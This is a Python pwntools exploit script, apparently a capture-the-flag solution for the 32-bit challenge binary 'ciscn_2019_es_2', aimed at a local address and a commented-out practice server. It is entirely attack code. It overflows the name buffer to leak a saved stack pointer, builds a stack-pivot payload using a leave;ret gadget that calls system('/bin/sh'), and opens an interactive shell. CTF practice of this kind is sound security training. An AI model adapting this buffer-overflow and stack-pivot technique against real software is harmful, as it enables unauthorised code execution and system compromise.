from pwn import *
context(os='linux',arch='i386',log_level='debug')
io  = remote('192.168.95.131',10001)
# io = remote('node4.buuoj.cn',25857)
elf = ELF('./ciscn_2019_es_2')

pause()
system_plt_addr = elf.symbols["system"]
main_addr = elf.symbols["main"]
leave_ret_addr = 0x080484b8

io.recvuntil(b"Welcome, my friend. What's your name?")

io.send(b"A"*37 + b"!@#")

io.recvuntil(b"!@#")

pre_ebp_addr = io.recv(4).ljust(4,b"\x00")
pre_ebp_addr = u32(pre_ebp_addr)
print(hex(pre_ebp_addr))
array_addr = pre_ebp_addr - 0x38

payload = flat(0x0,system_plt_addr,main_addr,array_addr + 16,b"/bin/sh\x00")
payload += b"A" * (40 - len(payload))
payload += flat(array_addr,leave_ret_addr)

pause()

io.sendline(payload)

io.recvuntil(b"Hello,")


pause()

io.interactive()
